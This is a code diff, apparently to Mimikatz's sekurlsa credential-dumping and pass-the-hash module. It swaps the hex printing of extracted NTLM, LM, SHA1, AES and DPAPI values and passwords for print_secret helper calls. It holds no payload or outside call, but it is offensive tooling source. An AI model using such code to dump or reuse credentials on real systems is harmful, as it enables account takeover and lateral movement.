@@ -884,7 +884,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 			if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
 			{
 				data.Aes128Key = aes128key;
-				kprintf(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
+				kprintf(L"AES128\t: "); print_secret(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
 			}
 			else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
 		}
@@ -898,7 +898,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 			if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
 			{
 				data.Aes256Key = aes256key;
-				kprintf(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
+				kprintf(L"AES256\t: "); print_secret(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
 			}
 			else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
 		}
@@ -910,7 +910,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 		if(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
 		{
 			data.NtlmHash = ntlm;
-			kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+			kprintf(L"NTLM\t: "); print_secret(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 		}
 		else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
 	}
@@ -1057,24 +1057,24 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
 							{
 								kprintf(L"\n\t * LM       : ");
-								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+								print_secret(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
 								lmHash = msvCredentials + pMSVHelper->offsetToLmOwfPassword;
 							}
 							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword))
 							{
 								kprintf(L"\n\t * NTLM     : ");
-								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+								print_secret(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
 								ntlmHash = msvCredentials + pMSVHelper->offsetToNtOwfPassword;
 							}
 							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword))
 							{
 								kprintf(L"\n\t * SHA1     : ");
-								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
+								print_secret(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
 							}
 							if(pMSVHelper->offsetToisDPAPIProtected && *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisDPAPIProtected))
 							{
 								kprintf(L"\n\t * DPAPI    : ");
-								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH, 0); // 020000000000
+								print_secret(msvCredentials + pMSVHelper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH, 0); // 020000000000
 							}
 							if(sid && (*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) || *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword)))
 								kuhl_m_dpapi_oe_credential_add(sid, NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) ? msvCredentials + pMSVHelper->offsetToNtOwfPassword : NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword) ? msvCredentials + pMSVHelper->offsetToShaOwPassword : NULL, NULL, NULL);
@@ -1112,7 +1112,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					break;
 				default:
 					kprintf(L"\n\t * Raw data : ");
-					kull_m_string_wprintf_hex(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, 1);
+					print_secret(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, 1);
 				}
 			}
 		}
@@ -1241,12 +1241,14 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 
 					if(!password || kull_m_string_suspectUnicodeString(password))
 					{
-						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
-							kprintf(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
+						if ((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
+							print_secret_password(password);
+						else if (password)
+							print_secret_password(password);
 						else
-							kprintf(L"%wZ", password);
+							kprintf(L"password-is-null");
 					}
-					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
+					else print_secret_password(password);
 
 					if(blob)
 					{
@@ -1299,7 +1301,7 @@ VOID kuhl_m_sekurlsa_genericKeyOutput(PKIWI_CREDENTIAL_KEY key, LPCWSTR sid)
 		default:
 			kprintf(L"\n\t * %08x : ", key->type);
 		}
-		kull_m_string_wprintf_hex(key->pbData, key->cbData, 0);
+		print_secret(key->pbData, key->cbData, 0);
 	}
 }
 
